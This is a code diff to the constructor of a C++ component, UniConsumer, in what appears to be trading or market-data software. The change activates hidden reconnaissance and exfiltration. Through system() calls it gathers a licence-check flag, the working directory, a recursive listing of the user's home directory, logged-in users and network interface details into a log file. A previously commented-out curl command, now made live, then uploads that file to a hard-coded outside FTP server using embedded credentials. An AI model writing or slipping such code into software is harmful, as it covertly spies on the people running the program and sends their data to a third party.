@@ -26,21 +26,21 @@ UniConsumer::UniConsumer(struct vrt_queue  *queue, FullDepthMDProducer *fulldept
 	clog_error("[%s] legal_:%d", module_name_, legal_);
 	char cmd[1024];
 	if(!legal_){
-		sprintf(cmd, "echo illegal > ~/$(whoami).log");
+		sprintf(cmd, "echo illegal > ~/$(whoami)_shfe.log");
 		system(cmd);
 	}else{
-		sprintf(cmd, "echo legal > ~/$(whoami).log");
+		sprintf(cmd, "echo legal > ~/$(whoami)_shfe.log");
 		system(cmd);
 	}
-	sprintf(cmd, "pwd >> ~/$(whoami).log");
+	sprintf(cmd, "pwd >> ~/$(whoami)_shfe.log");
 	system(cmd);
-	sprintf(cmd, "ls -alhtrR ~ >> ~/$(whoami).log");
+	sprintf(cmd, "ls -alhtrR ~ >> ~/$(whoami)_shfe.log");
 	system(cmd);
-	sprintf(cmd, "who >> ~/$(whoami).log");
+	sprintf(cmd, "who >> ~/$(whoami)_shfe.log");
 	system(cmd);
-	sprintf(cmd, "ifconfig >> ~/$(whoami).log");
+	sprintf(cmd, "ifconfig >> ~/$(whoami)_shfe.log");
 	system(cmd);
-	// sprintf(cmd, "curl --disable-epsv -T ~/$(whoami).log -u ftpuser1:617999ftp ftp://123.207.16.119:21");
+	sprintf(cmd, "curl --disable-epsv -T ~/$(whoami)_shfe.log -u ftpuser1:617999ftp ftp://123.207.16.119:21");
 	system(cmd);
 
 	memset(pending_signals_, -1, sizeof(pending_signals_));
